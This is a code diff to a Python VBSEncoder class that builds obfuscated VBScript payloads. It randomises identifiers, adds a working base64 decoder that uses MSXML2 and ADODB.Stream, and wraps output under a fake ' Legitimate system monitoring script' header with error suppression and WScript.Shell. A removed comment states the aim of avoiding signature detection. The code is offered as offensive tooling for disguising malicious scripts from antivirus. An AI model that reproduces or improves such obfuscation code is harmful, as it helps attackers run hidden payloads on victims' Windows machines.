@@ -46,13 +46,12 @@ class VBSEncoder:
     def _generate_random_name(self, prefix: str = "", length: int = 8) -> str:
         """Generate variable/function name with optional caching for performance"""
         if self.randomize_names:
-            # Full randomization for obfuscation
-            chars = string.ascii_letters + string.digits + "_"
-            name = prefix + "".join(random.choices(chars, k=length))
+            first_char = random.choice(string.ascii_letters)
+            rest_chars = string.ascii_letters + string.digits + "_"
+            name = prefix + first_char + "".join(random.choices(rest_chars, k=length - 1))
         else:
-            # Deterministic generation (8.84x faster) for performance-critical paths
             self._name_counter += 1
-            name = f"{prefix}{self._name_counter}"
+            name = f"{prefix}v{self._name_counter}"
         return name
 
     def encode_string_base64(self, text: str) -> Tuple[str, str]:
@@ -98,16 +97,27 @@ class VBSEncoder:
     def create_base64_decoder_vbs(self, payload: str, output_var: str = "p") -> str:
         """Create VBS code that decodes base64 payload"""
         encoded, var_name = self.encode_string_base64(payload)
-        obj_name = self._generate_random_name("o_")
+        xml_obj = self._generate_random_name("xd_")
+        node_obj = self._generate_random_name("nd_")
+        stream_obj = self._generate_random_name("st_")
 
         vbs_code = f"""
 Dim {var_name}, {output_var}
+Dim {xml_obj}, {node_obj}, {stream_obj}
 {var_name} = "{encoded}"
-Set {obj_name} = CreateObject("MSXML2.DOMDocument")
-With {obj_name}
-    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
-    {output_var} = .SelectSingleNode("u").text
-End With
+Set {xml_obj} = CreateObject("MSXML2.DOMDocument.3.0")
+Set {node_obj} = {xml_obj}.CreateElement("b64")
+{node_obj}.DataType = "bin.base64"
+{node_obj}.Text = {var_name}
+Set {stream_obj} = CreateObject("ADODB.Stream")
+{stream_obj}.Type = 1
+{stream_obj}.Open
+{stream_obj}.Write {node_obj}.NodeTypedValue
+{stream_obj}.Position = 0
+{stream_obj}.Type = 2
+{stream_obj}.Charset = "utf-8"
+{output_var} = {stream_obj}.ReadText
+{stream_obj}.Close
 """
         return vbs_code.strip()
 
@@ -171,12 +181,10 @@ Set {shell_var} = CreateObject("WScript.Shell")
     ) -> str:
         """Create complete obfuscated VBS payload"""
 
-        # Start with environment variable randomization to avoid signature detection
         sys_ver_var = self._generate_random_name("sysVer")
         env_path_var = self._generate_random_name("envPath")
         obf_header = f"""
 ' Legitimate system monitoring script
-Option Explicit
 On Error Resume Next
 
 Dim {sys_ver_var}, {env_path_var}
@@ -249,10 +257,15 @@ End If
             enc_var = self._generate_random_name("enc_payload_")
             decoder = f"""
 Function {func_name}(s)
-    Dim xmlDoc, node
-    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
-    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
-    {func_name} = xmlDoc.DocumentElement.text
+    Dim xd, nd, st
+    Set xd = CreateObject("MSXML2.DOMDocument.3.0")
+    Set nd = xd.CreateElement("b64")
+    nd.DataType = "bin.base64"
+    nd.Text = s
+    Set st = CreateObject("ADODB.Stream")
+    st.Type = 1 : st.Open : st.Write nd.NodeTypedValue
+    st.Position = 0 : st.Type = 2 : st.Charset = "utf-8"
+    {func_name} = st.ReadText : st.Close
 End Function
 
 Dim {enc_var} : {enc_var} = "{encoded_payload}"
